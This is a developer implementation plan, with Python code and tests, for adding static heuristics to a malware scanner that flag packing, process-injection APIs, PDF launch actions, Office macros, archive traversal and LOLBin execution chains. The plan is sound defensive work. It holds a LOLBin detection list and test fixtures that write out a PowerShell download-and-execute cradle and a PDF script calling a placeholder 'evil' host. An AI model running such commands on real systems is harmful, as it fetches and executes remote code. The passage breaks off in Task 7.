# Static Heuristics Enhancement Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a generic static heuristic evidence layer that raises suspicious-sample recall without signature hits by emitting normalized heuristic signals from format analyzers and archive extraction, then integrating them into the shared risk scorer.

**Architecture:** Keep the current worker analyzer contract and extend it with `heuristics`. Worker analyzers and `archive-extract` emit `HeuristicHit` payloads, `format-analysis` and `archive-extract` expose them in stage findings, and the backend scoring adapter converts them into `EvidenceRecord` objects with cap-family enforcement. Existing `indicators` and `risk_score` remain compatibility fallbacks in v1.

**Tech Stack:** Python 3.11, asyncio, pytest/pytest-asyncio, existing worker analyzers, backend shared scoring package under `backend/src/malscan/scoring/`

**Spec:** `docs/superpowers/specs/2026-04-10-static-heuristics-enhancement-design.md`

---

## File Structure

### New files

| File | Responsibility |
|---|---|
| `worker/src/malscan_worker/heuristics/__init__.py` | Public exports for heuristic helpers |
| `worker/src/malscan_worker/heuristics/models.py` | `HeuristicHit` dataclass and helper factory |
| `worker/src/malscan_worker/heuristics/common.py` | Generic entropy / LOLBin / structure helpers |
| `worker/src/malscan_worker/heuristics/pe.py` | PE-specific heuristic builders |
| `worker/src/malscan_worker/heuristics/pdf.py` | PDF-specific heuristic builders |
| `worker/src/malscan_worker/heuristics/script.py` | Script/LNK text-chain heuristic builders |
| `worker/src/malscan_worker/heuristics/archive.py` | Archive summary and archive heuristics builders |
| `worker/tests/heuristics/test_common.py` | Generic heuristic helper tests |
| `worker/tests/heuristics/test_pe_heuristics.py` | PE heuristic tests |
| `worker/tests/heuristics/test_pdf_heuristics.py` | PDF heuristic tests |
| `worker/tests/heuristics/test_script_heuristics.py` | Script heuristic tests |
| `worker/tests/heuristics/test_archive_heuristics.py` | Archive heuristic tests |

### Modified files

| File | Change |
|---|---|
| `worker/src/malscan_worker/analyzers/base.py` | Add `HeuristicHit` support to `AnalyzerResult` |
| `worker/src/malscan_worker/analyzers/pe_analyzer.py` | Emit PE heuristics alongside indicators |
| `worker/src/malscan_worker/analyzers/pdf_analyzer.py` | Emit PDF heuristics alongside indicators |
| `worker/src/malscan_worker/analyzers/script_analyzer.py` | Emit script heuristics and richer text features |
| `worker/src/malscan_worker/analyzers/lnk_analyzer.py` | Emit LNK/LOLBin heuristics |
| `worker/src/malscan_worker/analyzers/office_adapter.py` | Emit Office macro/template/resource heuristics |
| `worker/src/malscan_worker/stages/format_analysis.py` | Serialize `heuristics` in findings |
| `worker/src/malscan_worker/extractors/base.py` | Extend `ExtractionResult` with archive summary / heuristics payload |
| `worker/src/malscan_worker/stages/archive_extract.py` | Build archive summary and archive heuristics |
| `worker/src/malscan_worker/pipeline.py` | Include heuristic payloads in report serialization |
| `backend/src/malscan/scoring/adapters.py` | Normalize format/archive heuristics into `EvidenceRecord` objects |
| `backend/src/malscan/scoring/policy.py` | Add cap-group limits for heuristic families |
| `backend/src/malscan/scoring/engine.py` | Make cap enforcement data-driven for all cap groups |
| `worker/tests/test_format_analysis_stage.py` | Assert heuristics are preserved |
| `worker/tests/test_pipeline.py` | Assert report includes format/archive heuristics |
| `backend/tests/test_scoring_adapters.py` | Cover heuristic normalization |
| `backend/tests/test_scoring_engine.py` | Cover heuristic caps and gate behavior |

---

## Task 1: Add heuristic models and worker contract

**Files:**
- Create: `worker/src/malscan_worker/heuristics/__init__.py`
- Create: `worker/src/malscan_worker/heuristics/models.py`
- Modify: `worker/src/malscan_worker/analyzers/base.py`
- Test: `worker/tests/heuristics/test_common.py`

- [ ] **Step 1: Write the failing tests**

Create `worker/tests/heuristics/test_common.py`:

```python
from malscan_worker.heuristics.models import HeuristicHit, make_hit
from malscan_worker.analyzers.base import AnalyzerResult


def test_make_hit_builds_stable_heuristic_object() -> None:
    hit = make_hit(
        key="entropy.high_region_cluster",
        category="entropy",
        scope="pe",
        role="evidence_only",
        severity="medium",
        confidence=0.7,
        summary="Multiple high-entropy regions detected",
        evidence={"regions": [{"name": ".text", "entropy": 7.5}]},
        tags=("entropy", "packed"),
    )

    assert isinstance(hit, HeuristicHit)
    assert hit.key == "entropy.high_region_cluster"
    assert hit.role == "evidence_only"
    assert hit.evidence["regions"][0]["name"] == ".text"


def test_analyzer_result_exposes_heuristics_list() -> None:
    result = AnalyzerResult(analyzer_name="pe", format_type="PE")
    assert result.heuristics == []
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `cd worker && poetry run pytest tests/heuristics/test_common.py -v`

Expected: import failure because `malscan_worker.heuristics.models` and `AnalyzerResult.heuristics` do not exist yet.

- [ ] **Step 3: Add heuristic model file**

Create `worker/src/malscan_worker/heuristics/models.py`:

```python
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any


@dataclass(frozen=True)
class HeuristicHit:
    key: str
    category: str
    scope: str
    role: str
    severity: str
    confidence: float
    summary: str
    evidence: dict[str, Any] = field(default_factory=dict)
    tags: tuple[str, ...] = ()


def make_hit(
    *,
    key: str,
    category: str,
    scope: str,
    role: str,
    severity: str,
    confidence: float,
    summary: str,
    evidence: dict[str, Any] | None = None,
    tags: tuple[str, ...] = (),
) -> HeuristicHit:
    return HeuristicHit(
        key=key,
        category=category,
        scope=scope,
        role=role,
        severity=severity,
        confidence=confidence,
        summary=summary,
        evidence=evidence or {},
        tags=tags,
    )
```

- [ ] **Step 4: Export heuristic helpers**

Create `worker/src/malscan_worker/heuristics/__init__.py`:

```python
from malscan_worker.heuristics.models import HeuristicHit, make_hit

__all__ = ["HeuristicHit", "make_hit"]
```

- [ ] **Step 5: Extend `AnalyzerResult` minimally**

Modify `worker/src/malscan_worker/analyzers/base.py` so `AnalyzerResult` contains a `heuristics` field:

```python
from malscan_worker.heuristics.models import HeuristicHit


@dataclass
class AnalyzerResult:
    analyzer_name: str
    format_type: str
    indicators: list[AnalyzerIndicator] = field(default_factory=list)
    heuristics: list[HeuristicHit] = field(default_factory=list)
    features: dict[str, JsonValue] = field(default_factory=dict)
    extracted_strings: list[str] = field(default_factory=list)
    risk_score: int = 0
    risk_factors: list[str] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)
    extracted_artifacts: list[AnalyzerArtifact] = field(default_factory=list)
```

- [ ] **Step 6: Run the tests to verify they pass**

Run: `cd worker && poetry run pytest tests/heuristics/test_common.py -v`

Expected: `2 passed`

---

## Task 2: Implement generic heuristic helpers

**Files:**
- Create: `worker/src/malscan_worker/heuristics/common.py`
- Test: `worker/tests/heuristics/test_common.py`

- [ ] **Step 1: Add failing tests for entropy and LOLBin helpers**

Append to `worker/tests/heuristics/test_common.py`:

```python
from malscan_worker.heuristics.common import evaluate_entropy_regions, evaluate_lolbin_chain


def test_entropy_regions_emit_cluster_hit() -> None:
    hits = evaluate_entropy_regions(
        scope="pe",
        regions=[
            {"name": ".text", "entropy": 7.4},
            {"name": ".data", "entropy": 7.3},
        ],
    )
    assert hits[0].key == "entropy.high_region_cluster"


def test_lolbin_chain_distinguishes_reference_only_from_execution_chain() -> None:
    weak_hits = evaluate_lolbin_chain(scope="script", text="certutil -store my")
    strong_hits = evaluate_lolbin_chain(
        scope="script",
        text="powershell -enc AAAA; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://x')",
    )
    assert weak_hits[0].key == "lolbin.reference_only"
    assert strong_hits[0].key == "lolbin.execution_chain"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd worker && poetry run pytest tests/heuristics/test_common.py -v`

Expected: import failure because `common.py` does not exist.

- [ ] **Step 3: Implement generic helpers**

Create `worker/src/malscan_worker/heuristics/common.py`:

```python
from __future__ import annotations

from typing import Any

from malscan_worker.heuristics.models import HeuristicHit, make_hit


def evaluate_entropy_regions(*, scope: str, regions: list[dict[str, Any]]) -> list[HeuristicHit]:
    suspicious = [region for region in regions if float(region.get("entropy", 0.0)) >= 7.2]
    if len(suspicious) < 2:
        return []
    return [
        make_hit(
            key="entropy.high_region_cluster",
            category="entropy",
            scope=scope,
            role="evidence_only",
            severity="medium",
            confidence=0.65,
            summary="Multiple high-entropy regions detected",
            evidence={"regions": suspicious[:5], "count": len(suspicious)},
            tags=("entropy",),
        )
    ]


def evaluate_lolbin_chain(*, scope: str, text: str) -> list[HeuristicHit]:
    text_l = text.lower()
    referenced = [
        name
        for name in (
            "powershell",
            "mshta",
            "rundll32",
            "regsvr32",
            "certutil",
            "bitsadmin",
            "wscript",
            "cscript",
            "cmd /c",
        )
        if name in text_l
    ]
    if not referenced:
        return []

    has_remote = any(token in text_l for token in ("http://", "https://", "downloadstring", "downloadfile"))
    has_encoded = any(token in text_l for token in ("-enc", "encodedcommand", "frombase64string"))
    has_exec = any(token in text_l for token in ("invoke-expression", "start-process", "shell", "createprocess"))

    if has_remote or has_encoded or has_exec:
        return [
            make_hit(
                key="lolbin.execution_chain",
                category="lolbin",
                scope=scope,
                role="corroborating",
                severity="medium",
                confidence=0.8,
                summary="LOLBins appear in an execution-oriented chain",
                evidence={
                    "referenced": referenced,
                    "has_remote": has_remote,
                    "has_encoded": has_encoded,
                    "has_exec": has_exec,
                },
                tags=("lolbin",),
            )
        ]

    return [
        make_hit(
            key="lolbin.reference_only",
            category="lolbin",
            scope=scope,
            role="evidence_only",
            severity="low",
            confidence=0.55,
            summary="LOLBins referenced without a stronger chain",
            evidence={"referenced": referenced},
            tags=("lolbin",),
        )
    ]
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd worker && poetry run pytest tests/heuristics/test_common.py -v`

Expected: `4 passed`

---

## Task 3: Emit PE heuristics

**Files:**
- Create: `worker/src/malscan_worker/heuristics/pe.py`
- Modify: `worker/src/malscan_worker/analyzers/pe_analyzer.py`
- Test: `worker/tests/heuristics/test_pe_heuristics.py`
- Test: `worker/tests/analyzers/test_pe_analyzer.py`

- [ ] **Step 1: Add failing PE heuristic tests**

Create `worker/tests/heuristics/test_pe_heuristics.py`:

```python
from malscan_worker.heuristics.pe import build_pe_heuristics


def test_pe_heuristics_emit_packer_and_injection_hits() -> None:
    hits = build_pe_heuristics(
        {
            "sections": [
                {"name": "UPX0", "entropy": 7.8},
                {"name": "UPX1", "entropy": 7.7},
            ],
            "imports": [
                {"dll": "KERNEL32.dll", "functions": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]}
            ],
            "overlay": {"present": True, "size": 4096, "offset": 2048},
            "packer_clues": [{"type": "section_name", "value": "upx0"}],
        }
    )
    keys = {hit.key for hit in hits}
    assert "packer.known_section_name" in keys
    assert "packer.sparse_imports_high_entropy" in keys
    assert "api.process_injection_cluster" in keys
    assert "structure.overlay_anomaly" in keys
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd worker && poetry run pytest tests/heuristics/test_pe_heuristics.py -v`

Expected: import failure because `heuristics/pe.py` does not exist.

- [ ] **Step 3: Implement PE heuristic builder**

Create `worker/src/malscan_worker/heuristics/pe.py`:

```python
from __future__ import annotations

from typing import Any

from malscan_worker.heuristics.common import evaluate_entropy_regions
from malscan_worker.heuristics.models import HeuristicHit, make_hit


def build_pe_heuristics(features: dict[str, Any]) -> list[HeuristicHit]:
    hits: list[HeuristicHit] = []
    sections = list(features.get("sections", []))
    imports = list(features.get("imports", []))
    overlay = features.get("overlay") or {}
    packer_clues = list(features.get("packer_clues", []))

    hits.extend(evaluate_entropy_regions(scope="pe", regions=sections))

    if packer_clues:
        hits.append(
            make_hit(
                key="packer.known_section_name",
                category="packer",
                scope="pe",
                role="evidence_only",
                severity="medium",
                confidence=0.75,
                summary="Known packer section names detected",
                evidence={"packer_clues": packer_clues},
                tags=("packed",),
            )
        )

    if len(imports) <= 1 and any(float(item.get("entropy", 0)) >= 7.2 for item in sections):
        hits.append(
            make_hit(
                key="packer.sparse_imports_high_entropy",
                category="packer",
                scope="pe",
                role="corroborating",
                severity="medium",
                confidence=0.8,
                summary="Sparse imports with high-entropy sections suggest packing",
                evidence={"import_dll_count": len(imports), "sections": sections[:5]},
                tags=("packed",),
            )
        )

    function_names = {
        fn.lower()
        for item in imports
        if isinstance(item, dict)
        for fn in item.get("functions", [])
        if isinstance(fn, str)
    }
    injection = {"virtualallocex", "writeprocessmemory", "createremotethread"}
    matched_injection = sorted(injection & function_names)
    if len(matched_injection) >= 3:
        hits.append(
            make_hit(
                key="api.process_injection_cluster",
                category="api_pattern",
                scope="pe",
                role="gate_signal",
                severity="high",
                confidence=0.9,
                summary="Process injection API cluster detected",
                evidence={"matched": matched_injection},
                tags=("injection",),
            )
        )

    if overlay.get("present") and int(overlay.get("size", 0) or 0) >= 1024:
        hits.append(
            make_hit(
                key="structure.overlay_anomaly",
                category="structure",
                scope="pe",
                role="evidence_only",
                severity="low",
                confidence=0.6,
                summary="Unexpected PE overlay data present",
                evidence=dict(overlay),
                tags=("overlay",),
            )
        )

    return hits
```

- [ ] **Step 4: Wire PE heuristics into the analyzer**

Modify `worker/src/malscan_worker/analyzers/pe_analyzer.py` after `result.features = {...}`:

```python
from malscan_worker.heuristics.pe import build_pe_heuristics

...

result.features = {
    "imports": imports,
    "exports": exports,
    "sections": sections,
    "headers": headers,
    "resources": resources,
    "packer_clues": packer_clues,
    "tls_callbacks": tls_callbacks,
    "debug_info": debug_info,
    "overlay": overlay,
    "is_dll": bool(getattr(pe, "is_dll", lambda: False)()),
    "is_64bit": self._is_64bit(pe),
}
result.heuristics = build_pe_heuristics(result.features)
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd worker && poetry run pytest tests/heuristics/test_pe_heuristics.py tests/analyzers/test_pe_analyzer.py -v`

Expected: PE heuristic tests pass and analyzer tests remain green.

---

## Task 4: Emit PDF heuristics

**Files:**
- Create: `worker/src/malscan_worker/heuristics/pdf.py`
- Modify: `worker/src/malscan_worker/analyzers/pdf_analyzer.py`
- Test: `worker/tests/heuristics/test_pdf_heuristics.py`

- [ ] **Step 1: Write the failing tests**

Create `worker/tests/heuristics/test_pdf_heuristics.py`:

```python
from malscan_worker.heuristics.pdf import build_pdf_heuristics


def test_pdf_heuristics_emit_launch_and_embedded_executable_hits() -> None:
    hits = build_pdf_heuristics(
        {
            "launch_actions": ["payload.exe"],
            "open_actions": ["/OpenAction"],
            "js_code": ["app.launchURL('https://evil')"],
            "embedded_files": [{"name": "payload.exe", "executable": True}],
            "suspicious_names": ["/J#61vaScript"],
            "stream_info": {"stream_count": 1, "filter_count": 4, "filters": ["/FlateDecode", "/JBIG2Decode"], "has_object_stream": True},
        }
    )
    keys = {hit.key for hit in hits}
    assert "pdf.launch_action_executable" in keys
    assert "resource.embedded_executable" in keys
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd worker && poetry run pytest tests/heuristics/test_pdf_heuristics.py -v`

Expected: import failure.

- [ ] **Step 3: Implement PDF heuristic builder**

Create `worker/src/malscan_worker/heuristics/pdf.py`:

```python
from __future__ import annotations

from typing import Any

from malscan_worker.heuristics.models import HeuristicHit, make_hit


def build_pdf_heuristics(features: dict[str, Any]) -> list[HeuristicHit]:
    hits: list[HeuristicHit] = []
    launch_actions = list(features.get("launch_actions", []))
    open_actions = list(features.get("open_actions", []))
    embedded_files = list(features.get("embedded_files", []))
    suspicious_names = list(features.get("suspicious_names", []))

    executable_launches = [item for item in launch_actions if str(item).lower().endswith((".exe", ".dll", ".js", ".vbs", ".ps1"))]
    if executable_launches:
        hits.append(
            make_hit(
                key="pdf.launch_action_executable",
                category="structure",
                scope="pdf",
                role="gate_signal",
                severity="high",
                confidence=0.9,
                summary="PDF launch action targets an executable-like payload",
                evidence={"launch_actions": executable_launches, "open_actions": open_actions},
                tags=("pdf", "launch"),
            )
        )

    executable_embeds = [item for item in embedded_files if isinstance(item, dict) and item.get("executable")]
    if executable_embeds:
        hits.append(
            make_hit(
                key="resource.embedded_executable",
                category="resource",
                scope="pdf",
                role="corroborating",
                severity="medium",
                confidence=0.85,
                summary="PDF embeds executable-like attachments",
                evidence={"embedded_files": executable_embeds},
                tags=("embedded-executable",),
            )
        )

    if any("#" in str(item) for item in suspicious_names):
        hits.append(
            make_hit(
                key="structure.malformed_container",
                category="structure",
                scope="pdf",
                role="evidence_only",
                severity="low",
                confidence=0.6,
                summary="PDF contains obfuscated or unusual name tokens",
                evidence={"suspicious_names": suspicious_names},
                tags=("pdf-obfuscation",),
            )
        )

    return hits
```

- [ ] **Step 4: Wire heuristics into the PDF analyzer**

Modify `worker/src/malscan_worker/analyzers/pdf_analyzer.py` just before return:

```python
from malscan_worker.heuristics.pdf import build_pdf_heuristics

...

result.features = features
result.heuristics = build_pdf_heuristics(features)
result.indicators = indicators
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd worker && poetry run pytest tests/heuristics/test_pdf_heuristics.py tests/analyzers/test_pdf_analyzer.py -v`

Expected: tests pass and existing PDF analyzer behavior remains intact.

---

## Task 5: Emit script, LNK, and Office heuristics

**Files:**
- Create: `worker/src/malscan_worker/heuristics/script.py`
- Modify: `worker/src/malscan_worker/analyzers/script_analyzer.py`
- Modify: `worker/src/malscan_worker/analyzers/lnk_analyzer.py`
- Modify: `worker/src/malscan_worker/analyzers/office_adapter.py`
- Test: `worker/tests/heuristics/test_script_heuristics.py`
- Test: `worker/tests/analyzers/test_script_analyzer.py`
- Test: `worker/tests/analyzers/test_lnk_analyzer.py`
- Test: `worker/tests/analyzers/test_office_adapter.py`

- [ ] **Step 1: Add failing heuristic tests for text execution chains**

Create `worker/tests/heuristics/test_script_heuristics.py`:

```python
from malscan_worker.heuristics.script import build_script_heuristics


def test_script_heuristics_emit_encoded_exec_and_lolbin_chain() -> None:
    hits = build_script_heuristics(
        {
            "script_type": "powershell",
            "encoded_strings": ["SGVsbG8=", "frombase64string"],
            "download_operations": ["invoke_webrequest"],
            "exec_operations": ["invoke_expression", "start_process"],
            "process_operations": [],
            "registry_operations": [],
            "obfuscation_score": 80,
            "text_preview": "powershell -enc AAAA; IEX (New-Object Net.WebClient).DownloadString('https://x')",
            "max_line_length": 600,
        }
    )
    keys = {hit.key for hit in hits}
    assert "script.encoded_command_execution" in keys
    assert "lolbin.execution_chain" in keys
    assert "script.long_line_entropy_cluster" in keys
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd worker && poetry run pytest tests/heuristics/test_script_heuristics.py -v`

Expected: import failure.

- [ ] **Step 3: Implement text-chain heuristic builder**

Create `worker/src/malscan_worker/heuristics/script.py`:

```python
from __future__ import annotations

from typing import Any

from malscan_worker.heuristics.common import evaluate_lolbin_chain
from malscan_worker.heuristics.models import HeuristicHit, make_hit


def build_script_heuristics(features: dict[str, Any], *, scope: str = "script") -> list[HeuristicHit]:
    hits: list[HeuristicHit] = []
    encoded_strings = list(features.get("encoded_strings", []))
    download_ops = list(features.get("download_operations", []))
    exec_ops = list(features.get("exec_operations", []))
    obfuscation_score = int(features.get("obfuscation_score", 0) or 0)
    text_preview = str(features.get("text_preview", "") or "")
    max_line_length = int(features.get("max_line_length", 0) or 0)

    if encoded_strings and exec_ops:
        hits.append(
            make_hit(
                key="script.encoded_command_execution",
                category="script_token",
                scope=scope,
                role="gate_signal",
                severity="high",
                confidence=0.9,
                summary="Encoded payload and execution primitives appear together",
                evidence={"encoded_strings": encoded_strings[:5], "exec_operations": exec_ops},
                tags=("encoded", "execution"),
            )
        )

    if "amsi" in text_preview.lower() and "bypass" in text_preview.lower():
        hits.append(
            make_hit(
                key="script.amsi_bypass",
                category="script_token",
                scope=scope,
                role="corroborating",
                severity="medium",
                confidence=0.8,
                summary="AMSI bypass token cluster detected",
                evidence={"preview": text_preview[:200]},
                tags=("amsi",),
            )
        )

    if max_line_length >= 500 and obfuscation_score >= 70:
        hits.append(
            make_hit(
                key="script.long_line_entropy_cluster",
                category="script_token",
                scope=scope,
                role="evidence_only",
                severity="low",
                confidence=0.65,
                summary="Long high-obfuscation lines detected",
                evidence={"max_line_length": max_line_length, "obfuscation_score": obfuscation_score},
                tags=("obfuscation",),
            )
        )

    hits.extend(evaluate_lolbin_chain(scope=scope, text=text_preview))

    if download_ops and exec_ops:
        hits.append(
            make_hit(
                key="script.download_execute_chain",
                category="script_token",
                scope=scope,
                role="corroborating",
                severity="medium",
                confidence=0.85,
                summary="Downloader and execution operations appear together",
                evidence={"download_operations": download_ops, "exec_operations": exec_ops},
                tags=("download-exec",),
            )
        )

    return hits
```

- [ ] **Step 4: Feed richer text features from analyzers**

Modify `worker/src/malscan_worker/analyzers/script_analyzer.py`:

```python
from malscan_worker.heuristics.script import build_script_heuristics

...

max_line_length = max((len(line) for line in lines), default=0)

features = {
    "script_type": script_type,
    "line_count": line_count,
    "max_line_length": max_line_length,
    "obfuscation_score": obfuscation_score,
    "encoded_strings": self._as_json_list(encoded_strings),
    "network_indicators": self._as_json_list(network_indicators),
    "process_operations": self._as_json_list(process_operations),
    "registry_operations": self._as_json_list(registry_operations),
    "file_operations": self._as_json_list(file_operations),
    "download_operations": self._as_json_list(download_operations),
    "exec_operations": self._as_json_list(exec_operations),
    "text_preview": decoded[:1000],
}

result.heuristics = build_script_heuristics(features)
```

Modify `worker/src/malscan_worker/analyzers/lnk_analyzer.py` after `features["decoded_command"]`:

```python
from malscan_worker.heuristics.script import build_script_heuristics

text_preview = " ".join(
    value for value in (command_chain, decoded_command, target_path, working_dir, network_path) if value
)
script_features = {
    "encoded_strings": [decoded_command] if decoded_command else [],
    "download_operations": ["network_target"] if network_path else [],
    "exec_operations": ["lnk_target"] if command_chain else [],
    "process_operations": [],
    "registry_operations": [],
    "obfuscation_score": 80 if decoded_command else 0,
    "text_preview": text_preview,
    "max_line_length": len(command_chain),
}
result.heuristics = build_script_heuristics(script_features, scope="lnk")
```

Modify `worker/src/malscan_worker/analyzers/office_adapter.py` before return:

```python
from malscan_worker.heuristics.models import make_hit

heuristics = []
macros = findings.get("macros", {})
if isinstance(macros, dict) and macros.get("auto_exec") and suspicious_keywords:
    heuristics.append(
        make_hit(
            key="office.macro_autoexec_launcher",
            category="script_token",
            scope="office",
            role="corroborating",
            severity="medium",
            confidence=0.85,
            summary="Office auto-exec macro contains suspicious launcher keywords",
            evidence={"keywords": suspicious_keywords[:10], "macros": macros},
            tags=("macro", "autoexec"),
        )
    )

for indicator in indicators:
    if indicator.get("type") in {"external_template", "external_relationship"}:
        heuristics.append(
            make_hit(
                key="office.external_template_execution",
                category="structure",
                scope="office",
                role="gate_signal",
                severity="high",
                confidence=0.9,
                summary="Office document references external template or relationship target",
                evidence={"indicator": dict(indicator)},
                tags=("template-injection",),
            )
        )

result.heuristics = heuristics
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd worker && poetry run pytest tests/heuristics/test_script_heuristics.py tests/analyzers/test_script_analyzer.py tests/analyzers/test_lnk_analyzer.py tests/analyzers/test_office_adapter.py -v`

Expected: new heuristic tests pass and existing analyzer tests stay green.

---

## Task 6: Add archive summary and archive heuristics

**Files:**
- Create: `worker/src/malscan_worker/heuristics/archive.py`
- Modify: `worker/src/malscan_worker/extractors/base.py`
- Modify: `worker/src/malscan_worker/stages/archive_extract.py`
- Test: `worker/tests/heuristics/test_archive_heuristics.py`
- Test: `worker/tests/test_archive_password.py`

- [ ] **Step 1: Write the failing archive heuristic tests**

Create `worker/tests/heuristics/test_archive_heuristics.py`:

```python
from malscan_worker.heuristics.archive import build_archive_summary, build_archive_heuristics
from malscan_worker.extractors.base import ExtractedFile


def test_archive_heuristics_emit_executable_concentration_and_traversal() -> None:
    files = [
        ExtractedFile(path="/tmp/a.exe", original_name="a.exe", size=10, origin_path="a.exe"),
        ExtractedFile(path="/tmp/b.ps1", original_name="b.ps1", size=12, origin_path="nested/b.ps1"),
        ExtractedFile(path="/tmp/c.lnk", original_name="c.lnk", size=14, origin_path="nested/deep/c.lnk"),
    ]
    summary = build_archive_summary(files=files, warnings=["Path traversal skipped: ../run.vbs"], password_protected=False)
    hits = build_archive_heuristics(summary)
    keys = {hit.key for hit in hits}
    assert "archive.executable_concentration" in keys
    assert "archive.path_traversal_member" in keys
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd worker && poetry run pytest tests/heuristics/test_archive_heuristics.py -v`

Expected: import failure.

- [ ] **Step 3: Implement archive helper module**

Create `worker/src/malscan_worker/heuristics/archive.py`:

```python
from __future__ import annotations

from collections import Counter

from malscan_worker.extractors.base import ExtractedFile
from malscan_worker.heuristics.models import HeuristicHit, make_hit


EXECUTABLE_EXTS = {".exe", ".dll", ".js", ".vbs", ".ps1", ".lnk", ".bat", ".cmd", ".scr"}
ARCHIVE_EXTS = {".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".iso"}


def build_archive_summary(*, files: list[ExtractedFile], warnings: list[str], password_protected: bool) -> dict[str, object]:
    basenames = [item.original_name.lower() for item in files]
    basename_counter = Counter(basenames)
    exts = [item.original_name.lower().rsplit(".", 1)[-1] if "." in item.original_name else "" for item in files]

    executable_member_count = sum(
        1 for item in files if any(item.original_name.lower().endswith(ext) for ext in EXECUTABLE_EXTS)
    )
    nested_archive_count = sum(
        1 for item in files if any(item.original_name.lower().endswith(ext) for ext in ARCHIVE_EXTS)
    )
    max_member_depth = max((item.origin_path.count("/") + 1 for item in files), default=0)

    return {
        "entry_count": len(files),
        "executable_member_count": executable_member_count,
        "nested_archive_count": nested_archive_count,
        "duplicate_basename_count": sum(1 for count in basename_counter.values() if count > 1),
        "max_member_depth": max_member_depth,
        "password_protected": password_protected,
        "path_traversal_skipped": sum(1 for warning in warnings if "Path traversal skipped:" in warning),
        "total_extracted_bytes": sum(item.size for item in files),
        "member_extension_histogram": dict(Counter(exts)),
    }


def build_archive_heuristics(summary: dict[str, object]) -> list[HeuristicHit]:
    hits: list[HeuristicHit] = []

    if int(summary.get("executable_member_count", 0) or 0) >= 2:
        hits.append(
            make_hit(
                key="archive.executable_concentration",
                category="archive",
                scope="archive",
                role="corroborating",
                severity="medium",
                confidence=0.8,
                summary="Archive contains multiple executable-like members",
                evidence={"executable_member_count": summary.get("executable_member_count")},
                tags=("archive", "embedded-executable"),
            )
        )

    if bool(summary.get("password_protected", False)):
        hits.append(
            make_hit(
                key="archive.password_protected",
                category="archive",
                scope="archive",
                role="evidence_only",
                severity="low",
                confidence=0.7,
                summary="Archive requires a password for extraction",
                evidence={"password_protected": True},
                tags=("archive", "encrypted"),
            )
        )

    if int(summary.get("path_traversal_skipped", 0) or 0) > 0:
        hits.append(
            make_hit(
                key="archive.path_traversal_member",
                category="archive",
                scope="archive",
                role="evidence_only",
                severity="low",
                confidence=0.75,
                summary="Archive contains unsafe path traversal members",
                evidence={"path_traversal_skipped": summary.get("path_traversal_skipped")},
                tags=("archive", "path-traversal"),
            )
        )

    if int(summary.get("max_member_depth", 0) or 0) >= 4:
        hits.append(
            make_hit(
                key="archive.deep_nesting",
                category="archive",
                scope="archive",
                role="evidence_only",
                severity="low",
                confidence=0.6,
                summary="Archive member paths are deeply nested",
                evidence={"max_member_depth": summary.get("max_member_depth")},
                tags=("archive", "nesting"),
            )
        )

    return hits
```

- [ ] **Step 4: Extend extraction and stage outputs**

Modify `worker/src/malscan_worker/extractors/base.py`:

```python
@dataclass
class ExtractionResult:
    files: list[ExtractedFile]
    malicious: bool = False
    reason: str | None = None
    warnings: list[str] = field(default_factory=list)
    archive_type: str | None = None
    password_protected: bool = False
```

Modify `worker/src/malscan_worker/stages/archive_extract.py` before the final `StageResult`:

```python
from malscan_worker.heuristics.archive import build_archive_heuristics, build_archive_summary

...

archive_summary = build_archive_summary(
    files=result.files,
    warnings=result.warnings,
    password_protected=bool(getattr(result, "password_protected", False)),
)
archive_heuristics = build_archive_heuristics(archive_summary)

return StageResult(
    ...,
    findings={
        "archive_type": handler.name,
        "extracted_count": len(result.files),
        "sub_jobs_created": sub_jobs_created,
        "artifacts_created": len(created_artifacts),
        "warnings": result.warnings,
        "total_extracted_bytes": sum(ef.size for ef in result.files),
        "archive_summary": archive_summary,
        "heuristics": [hit.__dict__ for hit in archive_heuristics],
    },
    ...,
)
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd worker && poetry run pytest tests/heuristics/test_archive_heuristics.py tests/test_archive_password.py -v`

Expected: archive heuristic tests pass and password tests remain green.

---

## Task 7: Preserve heuristics in stage and report shaping

**Files:**
- Modify: `worker/src/malscan_worker/stages/format_analysis.py`
- Modify: `worker/src/malscan_worker/pipeline.py`
- Test: `worker/tests/test_format_analysis_stage.py`
- Test: `worker/tests/test_pipeline.py`

- [ ] **Step 1: Add failing stage serialization tests**

Append to `worker/tests/test_format_analysis_stage.py`:

```python
async def test_format_stage_preserves_heuristics_in_findings(tmp_path, monkeypatch):
    class _Analyzer:
        name = "script"

        async def analyze(self, file_path, ctx):
            del file_path, ctx
            from malscan_worker.heuristics.models import make_hit
            return AnalyzerResult(
                analyzer_name="script",
                format_type="SCRIPT",
                heuristics=[
                    make_hit(
                        key="script.encoded_command_execution",
                        category="script_token",
                        scope="script",
                        role="gate_signal",
                        severity="high",
                        confidence=0.9,
                        summary="Encoded payload and execution primitives appear together",
                    )
                ],
            )

    monkeypatch.setattr(
        "malscan_worker.stages.format_analysis.get_default_analyzer_registry",
        lambda: _FakeRegistry(_Analyzer()),
    )

    stage = FormatAnalysisStage()
    result = await stage.execute(_ctx(tmp_path))
    assert result.findings["heuristics"][0]["key"] == "script.encoded_command_execution"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd worker && poetry run pytest tests/test_format_analysis_stage.py::test_format_stage_preserves_heuristics_in_findings -v`

Expected: key error because `heuristics` is not serialized yet.

- [ ] **Step 3: Serialize heuristics in `FormatAnalysisStage`**

Modify `worker/src/malscan_worker/stages/format_analysis.py`:

```python
findings = {
    "analyzer": analysis.analyzer_name or analyzer.name,
    "format_type": analysis.format_type,
